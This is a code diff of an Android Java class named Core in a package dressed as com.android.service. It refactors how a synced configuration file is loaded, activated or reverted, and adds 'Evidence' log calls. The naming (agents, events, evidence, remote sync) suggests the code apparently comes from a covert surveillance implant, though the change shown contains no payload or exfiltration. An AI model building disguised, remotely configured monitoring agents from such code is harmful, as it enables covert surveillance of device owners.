@@ -18,6 +18,7 @@ import com.android.service.agent.AgentManager;
 import com.android.service.auto.Cfg;
 import com.android.service.conf.Configuration;
 import com.android.service.event.EventManager;
+import com.android.service.evidence.Evidence;
 import com.android.service.file.AutoFile;
 import com.android.service.file.Path;
 import com.android.service.util.Check;
@@ -75,6 +76,7 @@ public class Core extends Activity implements Runnable {
 			if(Cfg.DEBUG) { Check.log(e); }
 		}
 		
+		Evidence.info("Started");
 		return true;
 	}
 
@@ -265,22 +267,29 @@ public class Core extends Activity implements Runnable {
 		boolean loaded = false;
 
 		// tries to load the file got from the sync, if any.
-		final AutoFile file = new AutoFile(Path.conf() + Configuration.NEW_CONF);
+		AutoFile file = new AutoFile(Path.conf() + Configuration.NEW_CONF);
 
 		if (file.exists()) {
-			final byte[] resource = file.read(8);
-
-			// Initialize the configuration object
-			final Configuration conf = new Configuration(resource);
-
-			// Load the configuration
-			loaded = conf.LoadConfiguration();
-
-			if(Cfg.DEBUG) Check.log( TAG + " Info: Conf file loaded: " + loaded);
+			loaded = loadConfFile(file);
 
 			if (!loaded) {
+				Evidence.info("Invalid new configuration, reverting");
 				file.delete();
+			}else{
+				Evidence.info("New configuration activated");
+				file.rename(Path.conf() + Configuration.ACTUAL_CONF);
 			}
+		}
+		
+		// get the actual configuration
+		if(!loaded){			
+			file = new AutoFile(Path.conf() + Configuration.ACTUAL_CONF);
+			if (file.exists()) {
+				loaded = loadConfFile(file);
+				if (!loaded) {
+					Evidence.info("Actual configuration corrupted");
+				}				
+			}			
 		}
 
 		// tries to load the resource conf
@@ -297,6 +306,19 @@ public class Core extends Activity implements Runnable {
 			if(Cfg.DEBUG) Check.log( TAG + " Info: Resource file loaded: " + loaded);
 		}
 
+		return loaded;
+	}
+
+	private boolean loadConfFile(AutoFile file) throws GeneralException {
+		boolean loaded;
+		final byte[] resource = file.read(8);
+
+		// Initialize the configuration object
+		final Configuration conf = new Configuration(resource);
+
+		// Load the configuration
+		loaded = conf.LoadConfiguration();
+		if(Cfg.DEBUG) Check.log( TAG + " Info: Conf file loaded: " + loaded);
 		return loaded;
 	}
 
